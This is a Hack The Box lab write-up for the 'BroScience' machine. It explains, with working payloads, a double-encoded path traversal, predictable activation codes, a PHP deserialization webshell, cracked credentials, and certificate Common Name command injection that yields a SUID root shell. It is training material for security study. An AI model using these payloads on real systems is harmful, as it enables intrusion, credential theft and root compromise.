# BroScience — 10.129.228.129

Started 2026-08-18, rooted 2026-08-19. Host `broscience.htb` (in `/etc/hosts`).
HTB Linux / Medium. **✅ COMPLETE — user + root.**

## Status

| | |
|---|---|
| Foothold | ✅ RCE as `www-data` — webshell at `/sh.php?0=<cmd>` |
| DB access | ✅ postgres `broscience` as `dbuser`, users table dumped |
| Creds | ✅ **`bill` / `iluvhorsesandgym`** (+ michael, dmytro) |
| User shell | ✅ SSH as `bill` — app password reused on the system account |
| user.txt | ✅ captured |
| Root | ✅ command injection in `/opt/renew_cert.sh` via cert Common Name |
| root.txt | ✅ captured |

## Kill chain

```
unauth LFI  (includes/img.php?path=, double-URL-encoded)
  └─ read app source
       ├─ db_connect.php ....... postgres creds + hash salt "NaCl"
       └─ utils.php ............ two flaws:
            ├─ generate_activation_code()  srand(time())
            │     └─ predict code → activate own account → session
            └─ get_theme()  unserialize() on user-prefs cookie
                  └─ AvatarInterface::__wakeup() gadget → write sh.php
                        └─ RCE as www-data
                             └─ psql → users table → crack md5(NaCl.pw)
                                  └─ bill / iluvhorsesandgym → SSH  [user.txt]
                                       └─ root cron → /opt/renew_cert.sh
                                            └─ $commonName re-parsed by
                                               bash -c → SUID bash  [root.txt]
```

**Artifacts left on the box:** `/var/www/html/sh.php` (unauthenticated RCE)
and `/tmp/rootbash` (SUID root shell). Not cleaned — the HTB instance is
destroyed on shutdown, so they die with it. On a real engagement both would
have to be removed: either one hands the next person a free foothold.

---

# 1. Infrastructure

## Ports (`scans/full_scan.*`, `-p- -sV -sC`)

| Port | Service | Version |
|------|---------|---------|
| 22   | ssh     | OpenSSH 8.4p1 Debian 5+deb11u1 |
| 80   | http    | Apache 2.4.54 (Debian) — blanket 301 → `https://broscience.htb/` |
| 443  | ssl/http| Apache 2.4.54 (Debian) — the app |

- Debian 11 (bullseye). TTL 63 → 1 hop.
- Both `Host: broscience.htb` and `Host: 10.129.228.129` on :80 301 to
  `https://broscience.htb/` — no separate IP-based vhost.
- TLS cert: CN/O `broscience.htb` / `BroScience`, AT / Vienna,
  `administrator@broscience.htb`, self-signed 4096-bit RSA,
  valid 2022-07-14 → 2023-07-14 (**expired** — `curl -k` / `ffuf -k`).
- `PHPSESSID` set without `httponly`.
- **PostgreSQL 5432 is NOT externally exposed** — localhost-bound. Only
  reachable after code execution.
- Apache `/manual/` exposed (low value; see [Lessons](#lessons)).

## Host facts (from `/etc/passwd`, `loot/etc_passwd.txt`)

| entry | note |
|-------|------|
| `bill:x:1000:1000:...:/home/bill:/bin/bash` | **only real user**; matches app user id 2. SSH open → creds directly usable |
| `postgres:x:117:125:...:/bin/bash` | PostgreSQL installed, real shell |
| `www-data:x:33:33:...:/var/www:/usr/sbin/nologin` | webroot under `/var/www` |
| `_laurel:x:998:998::/var/log/laurel:/bin/false` | **auditd + Laurel** — enriched logging is on, everything is recorded |
| `root:x:0:0:root:/root:/bin/bash` | — |

- Desktop packages present (`Debian-gdm`, `pulse`, `avahi`, `colord`,
  `geoclue`, `saned`, `usbmux`, `rtkit`) → full desktop Debian, not minimal.
- No MTA beyond the stock `mail` entry → activation emails go nowhere.

---

# 2. Web application map

Hand-written PHP, UIkit 3.15.0 frontend, no framework.

## Webroot (authoritative — `ls` taken on the box)

```
activate.php   comment.php   exercise.php   images/    includes/
index.php      login.php     logout.php     register.php
sh.php ←ours   styles/       swap_theme.php update_user.php   user.php
```

| file | notes |
|---|---|
| `index.php` | exercise cards → `exercise.php?id=1..8` |
| `exercise.php?id=N` | article + comment form |
| `comment.php` | POST only; 302 → `/login.php` when unauthenticated |
| `user.php?id=N` | public profile, **no auth** — leaks email, activation, admin flag |
| `login.php` / `register.php` / `logout.php` | auth |
| `activate.php?code=` | consumes activation token — see §4 |
| `swap_theme.php` | theme toggle; only linked from navbar **when logged in** |
| `update_user.php` | target of the `user.php` edit form; renders for own profile or admin |
| `.htaccess` | 403 over HTTP (readable via LFI, unremarkable) |
| `sh.php` | **our webshell** — remove before finishing |

## `includes/` — complete (5 files, from directory listing)

```
db_connect.php   header.php   img.php   navbar.php   utils.php
```

- `img.php` — the LFI sink (§3)
- `utils.php` — activation-code generator + theme/deserialization code (§4, §5)
- `db_connect.php` — DB creds + hash salt (§6)
- `navbar.php` — 500s if requested directly (no `session_start()`, no
  `utils.php`, so `get_theme_class()` is undefined → fatal mid-tag)

## `styles/` and `images/`

- `styles/`: `light.css`, `dark.css` — `dark.css` is only reachable via
  `swap_theme.php`, which is invisible to anonymous users.
- `images/`: the 8 exercise images. Confirms `img.php?path=X` resolves
  against `/images/` as its base dir.

**mod_autoindex is enabled** on `/includes/`, `/images/`, `/styles/`,
`/icons/`. Webroot itself does *not* list (it has an `index.php`).

---

# 3. Vuln 1 — LFI via `includes/img.php?path=` ✅

Unauthenticated arbitrary file read as `www-data`.

## Working payload

```
/includes/img.php?path=.%252e%252f<×12>etc/pass%2577d
```

Generator: `exploits/lfi_grab.py` (double-encodes every byte).

## Why it works — decode-order

Two filters guard the endpoint, and **both inspect the once-decoded string
while the sink runs a second decode**:

1. `.%252e%252f` on the wire → Apache/PHP decodes once → `.%2e%2f`
2. Filters inspect *that* — no literal `../`, no literal `passwd` → pass
3. `img.php` calls `urldecode()` **itself** → `../` and `passwd` reappear

The bug is not a missing filter; it is **validation and sink at different
decode stages**. Proven by `etc/pass%2577d` returning the full file.

> **General primitive: double-encode any byte of the path — separator or
> filename — and the whole filter chain is blind.**

## Operational notes

- Response is always `Content-Type: image/png` regardless of content. Raw
  bytes in the body, nothing renders. **Triage bulk output by response
  length**, not status or MIME type.
- No auth, no cookie needed.
- Traversal depth 12 is overkill — `..` at `/` is a no-op, so anything at or
  above the true depth works identically.
- Bounded by uid 33 permissions (see [Dead ends](#dead-ends)).

---

# 4. Vuln 2 — predictable activation codes ✅

## The lock

New accounts can't log in until activated; the link is emailed and there is
no MTA. `activate.php` needs a 32-char code from a 62-char alphabet.

## The key — `includes/utils.php:2`

```php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());                                    // ← seeded with the clock
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}
```

Brute force is hopeless (`62^32` ≈ 2.27e57 ≈ 7.2e40 years at 1e9/sec) — and
irrelevant. The 32 characters are **one choice (the seed) expanded
deterministically**, and the seed is the Unix timestamp, which the server
publishes in the `Date:` header of the registration response itself.

| uncertainty window | candidates |
|---|---|
| ±5 s | 11 |
| 1 hour | 3,600 |
| 1 day | 86,400 |

PHP 7.1+ aliases `rand()`/`srand()` to `mt_rand()`/`mt_srand()` (Mersenne
Twister) — don't reimplement, run the target's own function locally.

## Procedure

```bash
# 1. register, capture the Date header
curl -sk -i -X POST https://broscience.htb/register.php \
  --data-urlencode 'username=errbit' --data-urlencode 'email=errbit@broscience.htb' \
  --data-urlencode 'password=Sup3rBr0Sci3nce' --data-urlencode 'password-confirm=Sup3rBr0Sci3nce' \
  | grep -iE '^HTTP|^Date:|Account created'

# 2. Date -> epoch
date -u -d '<Date header>' +%s

# 3. candidates (seed-5 .. seed+5)
php exploits/generate_activation_code.php <epoch> | tee exploits/activation_codes.txt

# 4. fuzz -- match the string, NOT a byte size
ffuf -w exploits/activation_codes.txt -k \
     -u 'https://broscience.htb/activate.php?code=FUZZ' -mr 'Account activated'
```

The window only needs to reach *backwards*: `time()` is called during request
processing, before Apache stamps `Date`, so true seed ≤ epoch.

## `activate.php` — the consuming end

- `preg_match('/^[A-z0-9]{32}$/', $_GET['code'])` — shape only, before any DB
  access.
- Then prepared `SELECT ... WHERE activation_code=$1`, and if found and not
  already active, `UPDATE users SET is_activated=TRUE`.
- Responses: `Account activated!` / `Account already activated.` /
  `Invalid activation code.`
- **No auth, no rate limit, no attempt counter, no expiry.**

---

# 5. Vuln 3 — PHP object injection → RCE ✅

## The sink — `includes/utils.php:63`

```php
function get_theme() {
    if (isset($_SESSION['id'])) {                       // ← gate: logged in only
        if (!isset($_COOKIE['user-prefs'])) {
            setcookie('user-prefs', base64_encode(serialize(new UserPrefs())));
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));   // ← SINK
        return $up->theme;
    }
    return "light";
}
```

Server-minted default:
```
O:9:"UserPrefs":1:{s:5:"theme";s:5:"light";}
Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO3M6NToibGlnaHQiO30=
```

- No signature/HMAC. Cookie round-trips through the client, trusted verbatim.
- `unserialize()` **constructs objects** — the attacker chooses the *class*,
  not just the values. `$up`'s declared type is irrelevant.
- `utils.php` is included on every page → every class it defines is in scope.
- Reached on essentially every authenticated page (`navbar.php:5` →
  `get_theme_class()` → `get_theme()`).

## Gadget chain (both classes in `utils.php`)

```php
class Avatar {
    public $imgPath;
    public function save($tmp) {
        $f = fopen($this->imgPath, "w");        // WHERE
        fwrite($f, file_get_contents($tmp));    // WHAT
    }
}
class AvatarInterface {
    public $tmp; public $imgPath;               // both public → cookie-settable
    public function __wakeup() {                // ENTRY: fires on unserialize
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
```

`AvatarInterface` = entry gadget (magic method); `Avatar` = action gadget
(the write). Neither is dangerous alone.

## Payload

```
O:15:"AvatarInterface":2:{
  s:3:"tmp";     s:44:"data://text/plain,<?php system($_GET[0]); ?>";
  s:7:"imgPath"; s:20:"/var/www/html/sh.php";
}
```
```
TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czo0NDoiZGF0YTovL3RleHQvcGxhaW4sPD9waHAgc3lzdGVtKCRfR0VUWzBdKTsgPz4iO3M6NzoiaW1nUGF0aCI7czoyMDoiL3Zhci93d3cvaHRtbC9zaC5waHAiO30=
```

Generator: `exploits/gen_payload.php` (reproduces the above byte-for-byte).

**Why `data://`:** `save()` writes `file_get_contents($tmp)` — it treats
`$tmp` as a *path/URL*, not content. `data://text/plain,<content>` makes
literal text into a readable stream, so no listener, no hosted file, no
outbound connection. Works with egress filtered.

**Never hand-write serialized PHP** — the format embeds exact byte lengths;
one wrong count and `unserialize()` returns `false` silently.

## Shell

```bash
curl -sk 'https://broscience.htb/sh.php?0=id'     # numeric key → ?0=
```

⚠ **Opsec:** `sh.php` is unauthenticated and world-reachable. Anyone who
finds it gets the same RCE. **Delete it when done.**

---

# 6. Loot & credentials

## `users` table (`loot/users_table.txt`)

Dumped via psql as `dbuser` after RCE. All 5 activated.

| id | user | md5 | admin | password |
|----|------|-----|-------|----------|
| 1 | administrator | `15657792073e8a843d4f91fc403454e1` | **t** | *uncracked* |
| 2 | **bill** | `13edad4932da9dbb57d9cd15b66ed104` | f | **`iluvhorsesandgym`** |
| 3 | michael | `bd3dad50e2d578ecba87d5fa15ca5f85` | f | `2applesplus2apples` |
| 4 | john | `a7eed23a7be6fe0d765197b1027453fe` | f | *uncracked* |
| 5 | dmytro | `5d15340bded5b9395d5d14b9c21bc82b` | f | `Aaronthehottest` |

✅ 3/5 cracked with rockyou (mode 20). All three verified locally by
recomputing `md5("NaCl" . $password)`. `administrator` and `john` did not
fall to plain rockyou — try rules if either is ever needed.

**`bill` / `iluvhorsesandgym`** is the one that matters: uid 1000,
`/bin/bash`, SSH open on 22.

✅ **CONFIRMED — password reused on the system account.** `ssh bill@10.129.228.129`
with `iluvhorsesandgym` works. The web-app hash was the whole path to a user
shell.

> Not a contradiction with the "password reuse — disproven" entry in
> [Dead ends](#7-dead-ends): that one was the *DB* password
> (`RangeOfMotion%777`) against *app* accounts. This is the *app* password
> reused on the *system* account. Different pair, opposite result.

Hashes are `md5("NaCl" . $password)` (`login.php:17`, `register.php:41`) —
a **single global salt**, not per-user, so identical passwords collide across
accounts (all five differ here).

### Cracking

`loot/hashes.txt` is already in `hash:salt` form. hashcat mode **20** =
`md5($salt.$pass)`.

```bash
cd /home/errbit/HTB/Labs/BroScience/loot

# all five, rockyou
hashcat -m 20 hashes.txt /usr/share/wordlists/rockyou.txt

# bill only (the one that matters — uid 1000 + SSH)
hashcat -m 20 '13edad4932da9dbb57d9cd15b66ed104:NaCl' /usr/share/wordlists/rockyou.txt

# show results (hashcat caches to its potfile; re-running looks like a no-op)
hashcat -m 20 hashes.txt --show

# if rockyou misses — rules
hashcat -m 20 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# john equivalent
john --format=dynamic_4 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=dynamic_4 --show hashes.txt
```

Add `--force` if hashcat complains about no OpenCL device in a VM.

**Priority: `bill`.** Only name that is also a Linux account (uid 1000,
`/bin/bash`) on a host with SSH open.

Activation codes are also in the table but spent — every account is active.

## PostgreSQL — `includes/db_connect.php`

| field | value |
|-------|-------|
| host / port | `localhost` / `5432` |
| dbname | `broscience` |
| user | `dbuser` |
| pass | `RangeOfMotion%777` |
| `$db_salt` | `NaCl` |

```bash
cd /tmp && PGPASSWORD='RangeOfMotion%777' psql -h localhost -U dbuser -d broscience -c '\dt'
```

- Localhost-bound — unusable from the VPN, needs RCE or a tunnel.
- Interactive password prompt fails without a PTY (`psql` reads `/dev/tty`) —
  use `PGPASSWORD`, or upgrade the shell first.
- `getcwd` errors in a webshell → `cd /tmp` first. `getcwd()` needs `+x` on
  every ancestor; without it `psql` can't even locate its own binary.

> ⚠ **`RangeOfMotion%777` contains a `%`.** In a form-urlencoded POST body it
> must be `RangeOfMotion%25777`. Pasted raw, `%77` → `w` and the server sees
> `RangeOfMotionw7` — a false negative that looks like a wrong password. No
> encoding over SSH or in `PGPASSWORD`; use the literal string there.

## Application users (front-end view, `user.php?id=`)

`user.php` serves any id unauthenticated and leaks email, activation state
and the admin flag.

| id | username | email | notes |
|----|----------|-------|-------|
| 1 | administrator | administrator@broscience.htb | the only admin |
| 2 | bill | bill@broscience.htb | also Linux uid 1000 |
| 3 | michael | michael@broscience.htb | |
| 4 | john | john@broscience.htb | |
| 5 | dmytro | dmytro@broscience.htb | **not linked anywhere in site HTML** — only found by walking ids |

> **Correction:** an earlier note recorded dmytro as an admin. The DB dump
> shows `is_admin = f`; `administrator` (id 1) is the only admin. dmytro is
> still notable for being invisible from the front end, just not privileged.

---

# 7. Privesc — command injection in `/opt/renew_cert.sh` ✅

Found with `pspy` as bill (took a few minutes — the first burst of output is
pspy's *startup inventory*, not events; the real hit has a later timestamp).

```
09:58:03 UID=0 PID=92403 | /usr/sbin/CRON -f
09:58:03 UID=0 PID=92407 | /bin/bash /root/cron.sh
09:58:03 UID=0 PID=92408 | timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt
09:58:03 UID=0 PID=92409 | /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt
09:58:03 UID=0 PID=92410 | /usr/bin/rm -r /home/bill/Certs/*
```

**The chain as observed, all UID 0:**
1. `cron` → `/bin/bash /root/cron.sh`
2. `/root/cron.sh` → `timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt`
3. then `/usr/bin/rm -r /home/bill/Certs/*`

**The structural fact:** a process running as **root** takes its input from
`/home/bill/Certs/` — a directory **bill owns**.

pspy filter used (drops kernel threads, which have an empty command field):
```bash
./pspy -c=false | grep --line-buffered 'UID=0' | grep --line-buffered -vE '\|\s*$'
```

## `/opt/renew_cert.sh` — readable by bill, copy in `loot/renew_cert.sh`

What it does, in order:
1. Requires exactly one argument; prints usage and exits `0` for `-h`,
   `--help`, `help`, or wrong argument count.
2. If the file exists: `openssl x509 -in $1 -noout -checkend 86400`. If the
   cert is valid for more than 24h, prints "No need to renew yet." and
   exits `1`.
3. Reads the subject with `openssl x509 -in $1 -noout -subject`, then pulls
   out `C`, `ST`, `L`, `O`, `OU`, `CN` with `grep -Eo` + offset-trimming +
   `awk -F,`, and the address with `openssl x509 -in $1 -noout -email`.
4. Echoes each extracted field.
5. Generates a new self-signed cert:
   `openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key
   -out /tmp/temp.crt -days 365`, feeding the extracted values on stdin via
   a here-string.
6. Final line:
   `/bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"`

`/root/cron.sh` is not readable by bill.

## Confirmed behaviour

**The pipeline runs to completion as root on every cycle.** Established via
`/tmp/temp.key` — line 45 writes both `/tmp/temp.key` and `/tmp/temp.crt`,
but only the `.crt` is moved away by line 54. The `.key` is never moved and
never deleted, so it is a **persistent artifact proving execution reached
line 45**:

```
$ stat -c '%U %y %n' /tmp/temp.key
root  2026-08-19 10:44:04  /tmp/temp.key
```

Owned by **root** (not bill), so this is the cron run, not a manual
invocation. Therefore both gates pass every cycle:
- `[ -f $1 ]` — root re-seeds `/home/bill/Certs/` after the `rm`, so a cert
  is always present at the start of the next cycle.
- `-checkend 86400` returns non-zero — the cert root plants is always inside
  the 24-hour renewal window.

Line 54's `mv` therefore executes on every cycle.

### Testing notes
- **`rm -r /home/bill/Certs/*` wipes the directory at the end of each cycle,
  so absence of an output file is NOT evidence the script failed.** Use the
  `/tmp/temp.key` mtime instead.
- The `rm` glob does not match dotfiles — a destination filename beginning
  with `.` survives the cleanup.
- An **empty/unparseable** file also passes the `-checkend` gate: `openssl
  x509` errors out and returns non-zero, which is indistinguishable from
  "expiring" to line 12.
- To make a cert that passes the gate deliberately (verified locally):
  ```bash
  openssl req -x509 -newkey rsa:2048 -nodes -keyout k.pem -out c.pem -days 1 \
    -subj "/C=AT/ST=Vienna/L=Vienna/O=BroScience/OU=IT/CN=broscience.htb/emailAddress=a@b.c"
  ```
  `-days 1` → `-checkend 86400` returns exit 1 → script continues.
- **Don't wait on cron to test.** `/opt/renew_cert.sh` is readable and
  executable by bill; run it directly against a cert of your own and it
  echoes every parsed field before doing anything.
- ⚠ **openssl version skew:** the box is Debian 11 / OpenSSL 1.1.1, which
  prints subjects as `C = AT, ST = Vienna` (spaces around `=`). OpenSSL 3.x
  prints `C=AT, ST=Vienna` (no spaces). The script's parsers
  (`grep -Eo 'C = .{2}'`) are written for the 1.1.1 format — test on the
  target, not on a modern local box.

## The vulnerability — line 54

```bash
/bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
```

`$commonName` comes from the certificate's Common Name — attacker-supplied.
It is expanded **twice**:

1. The script's own bash builds the string, splicing `$commonName` in. The
   result is still just *text* containing the characters `$`, `(`, `c`, `p`…
2. That text is handed to **`/bin/bash -c`**, which parses it **as code**.
   Now `$(...)` is command substitution and executes — as root.

**`/bin/bash -c` is the entire bug, and it is gratuitous.** `mv` is a binary,
not a shell builtin; it needs no shell. Written as
`mv /tmp/temp.crt "/home/bill/Certs/$commonName.crt"` the same payload
produces a file with a silly name and zero execution.

> **Same root cause as the LFI:** a value validated/interpolated in one
> context and then re-parsed in another. There it was a second `urldecode()`;
> here a second shell parse. Two languages, one bug class.

### Order of operations (why it fires at all)
Bash expands the whole command line *before* executing it:
```
PHASE 1 expansion   fork subshell → cp → chmod → capture stdout ("") → splice
PHASE 2 execution   execve("/bin/mv", ["mv","/tmp/temp.crt","/home/bill/Certs/.crt"])
```
The payload runs in phase 1, so **it fires whether or not `mv` succeeds**.
`mv` is only the vehicle that got the data into a shell parse.

Since `cp`/`chmod` print nothing, the substitution yields `""` and the
destination becomes `/home/bill/Certs/.crt` — a dotfile, which
`rm -r /home/bill/Certs/*` does not match. A stray `.crt` there is the
fingerprint that the injection fired.

## Working exploit

```bash
rm -f /tmp/rootbash          # MANDATORY — see gotcha 1 below

cd /tmp
openssl req -x509 -newkey rsa:2048 -nodes -keyout /dev/null \
  -out broscience.crt -days 1 \
  -subj '/C=AT/ST=Vienna/L=Vienna/O=BroScience/OU=IT/CN=$(cp \/bin\/bash \/tmp\/rootbash; chmod 4755 \/tmp\/rootbash)/emailAddress=test@broscience.htb'

openssl x509 -in broscience.crt -noout -subject     # VERIFY before deploying
cp broscience.crt /home/bill/Certs/broscience.crt   # then wait for cron

ls -la /tmp/rootbash        # want -rwsr-xr-x 1 root root
/tmp/rootbash -p            # -p is mandatory
id                          # uid=1000(bill) euid=0(root)
```

Equivalent stdin form (no DN escaping needed — answers the 7 prompts in
order, single-quoted so the payload stays literal):
```bash
printf 'AT\nVienna\nVienna\nBroScience\nIT\n$(cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash)\ntest@broscience.htb\n' \
  | openssl req -x509 -newkey rsa:2048 -nodes -keyout /dev/null -out broscience.crt -days 1 2>/dev/null
```

### Two quoting layers — the thing that cost the most time
**Layer 1, your shell.** Must be **single** quotes. In double quotes bash runs
`$(...)` immediately, as bill; `cp` prints nothing, so the CN becomes empty
and openssl silently *drops the whole CN field*. The cert looks fine and
carries no payload. This failure looks exactly like success — `/tmp/rootbash`
appears, owned by bill.

**Layer 2, OpenSSL's DN parser.** Inside `-subj` these are structural and need
a backslash:

| char | role in a DN | escape |
|---|---|---|
| `/` | field separator | `\/` |
| `+` | multi-valued RDN separator | `\+` |
| `=` | attribute/value separator | `\=` |
| `,` | RDN separator | avoid — `awk -F,` truncates there too |

These escapes are consumed by openssl; the certificate stores the clean text.
`chmod 4755` is preferred over `chmod +s` purely to avoid escaping `+`.

Drop `2>/dev/null` while testing: `req warning: Skipping unknown subject name
attribute` is the tell that layer 2 ate part of the payload.

### Gotchas
1. **`rm -f /tmp/rootbash` first.** `cp` onto an existing file reuses that
   inode — uid/gid are preserved. Root's copy would inherit **bill's**
   ownership, `chmod` would set setuid on a bill-owned file, and the result
   is a setuid-*bill* shell that looks perfect in `ls`.
2. **`/tmp/rootbash -p`** — bash drops euid on startup without `-p`. Without
   it you get a shell that looks like it worked and is still bill.
3. **`+s` vs `g+s`** — `chmod g+s` gives egid 0 only, euid unchanged. Need
   `u+s` (or `+s`, or `4755`).
4. **No commas in the payload** — `awk -F, '{print $1}'` truncates there.
5. `timeout 10` caps each cron run, so a reverse shell spawned inside may be
   killed. A SUID binary or an SSH key persists; a shell is a 10-second
   window you must catch live.

## Notes
- Cron interval was never precisely measured; a few minutes at most. The
  `/tmp/temp.key` mtime advances each cycle if you want to time it.
- `/root/cron.sh` is not readable by bill; it re-seeds
  `/home/bill/Certs/` after the `rm`, which is why the pipeline is
  self-sustaining.

# 8. Dead ends

Do not re-walk these.

- **SQLi — absent, confirmed from source.** All 12 queries use
  `pg_prepare()` + `pg_execute()` with positional placeholders; input only
  ever in the param array. The one raw `pg_query()` (`index.php:23`) has a
  fully static query. Both `?id=` params also gated by `FILTER_VALIDATE_INT`.
- **`/home/bill/.ssh/` unreadable via LFI** — empty for `id_rsa`,
  `id_ed25519`, `authorized_keys`. `~/.ssh` is `0700 bill:bill`. Not a
  payload failure; `/etc/passwd` through the same primitive works. The LFI is
  bounded by uid 33.
- **Password reuse of `RangeOfMotion%777` — disproven** across all 5 app
  accounts (`exploits/cred_check.py`). The mangled-encoding control row
  behaved identically, so encoding is ruled out as a confound.
- `login.php:16` keys on **username, not email** — early attempts using
  `administrator@broscience.htb` could never have matched.
- Guessed admin passwords (`password`, `password123`) — no.
- **SUID sweep as `bill` — nothing.** `find / -perm -4000 -type f` returns
  only stock Debian 11 desktop + VMware binaries:
  ```
  chfn chsh fusermount3 gpasswd mount newgrp ntfs-3g passwd su sudo umount
  vmware-user-suid-wrapper  dbus-daemon-launch-helper  polkit-agent-helper-1
  ssh-keysign  Xorg.wrap  pppd
  ```
  No custom binaries, nothing in `/opt`, `/usr/local`, or a home dir.
  - `pkexec` is **absent** → PwnKit (CVE-2021-4034) not applicable.
  - `sudo` is SUID and present. bill has no sudoers entry, but that does
    *not* rule out CVE-2021-3156 (Baron Samedit), which needs no sudo
    rights. Bullseye ships 1.9.5p2 (patched); confirm with
    `sudo --version` rather than assuming. **Lesson: "no sudo rights" ≠
    "sudo binary is safe".**
- `sudo` — bill has no sudoers entry.
- **Dirty Pipe (CVE-2022-0847) — patched, not viable.**
  Kernel is `5.10.0-20-amd64`, Debian `5.10.158-2` (2022-12-13).
  CVE-2022-0847 was introduced in 5.8 and fixed upstream in **5.10.102**
  (also 5.15.25 / 5.16.11); Debian bullseye got it in 5.10.103-1, DSA-5092-1,
  March 2022. This kernel is 56 point releases past that.
  - **Lesson:** on a distro stable branch the headline `5.10` means nothing —
    Debian pins major.minor for the release lifetime and backports fixes into
    the *third* component. Compare `158` vs `102`, and cross-check the Debian
    package version against the Security Tracker, since Debian sometimes
    backports without reaching the upstream fix number at all.
    `searchsploit`-style matching on "5.10" yields piles of long-patched CVEs.
  - Kernel privesc generally low-yield here: Dec 2022 kernel, box authored
    early 2023.

---

# 9. Lessons

Methodology errors made here, worth not repeating.

**Fuzzing the wrong scheme, then filtering the only status returned.**
`ffuf -u http://... -fc 301` — port 80 blanket-301s everything, so every
response was an identical 301 and `-fc 301` filtered 100% of them. Zero hits
looked like "no hidden files" while nothing had been tested.
→ **Always validate a scan config against a file you know exists.**

**A crashed scan is not a completed scan.** An earlier run died partway; the
risk isn't the file it missed but that the whole sweep silently became
unreliable while still feeling done.

**Wordlist coverage ≠ scan correctness.** The clean re-run still missed
`swap_theme.php` and `update_user.php`: `directory-list-2.3-medium` has
`swap`, `theme`, `update`, `user` individually but no underscore compounds.
Nothing in the output looked wrong. Both files were **already named in source
we had pulled hours earlier** (`navbar.php:15`, `user.php:94`).
→ **With file read, `grep -rhoE '[A-Za-z0-9_/.-]+\.php'` over retrieved
source beats any wordlist. Do it first, and re-run it whenever new source
lands.**

**Vendor doc trees poison crawls.** Apache `/manual/` (thousands of pages,
13 languages) made a link-extraction pass ~99% junk — and turned *example
filesystem paths in documentation prose* into plausible fake URLs
(`/var/www/html`, `/usr/local/apache/htdocs/…`, `/page.php?page=123`,
`/siteler/…` from the Turkish translation). None existed; nothing fetched
them. → Exclude doc trees; never treat an extracted URL as a discovered path
without a status code behind it.

**A `%` in a credential silently mangles through form encoding.** Cost a
false negative on the whole password-reuse theory until a deliberately-
mangled *control row* was added to the test matrix to rule encoding out.

**Instance-specific values from published writeups are dead on arrival.**
The official PDF's activation codes came from seed `1673269358` on
`10.10.11.195` in 2023 — they were saved locally and nearly used here.
Anything derived from a timestamp, IP, session or response size must be
re-derived. (Its `--fs 1256` happened to match this instance, but that was
luck — `-mr 'Account activated'` is the robust form.)

---

# 10. Files

```
scans/      full_scan.*            nmap -p- -sV -sC
            ffuf_root_php.json     root content discovery
logging/    initial recon requests.xml   Burp export
loot/       etc_passwd.txt  users_table.txt  hashes.txt
            src/                   full app source via LFI
exploits/   lfi_grab.py            bulk file read
            gen_payload.php        deserialization payload builder
            generate_activation_code.php   seed → candidate codes
            cred_check.py          login password tester
writeup.md  handoff doc for the Obsidian vault session
```
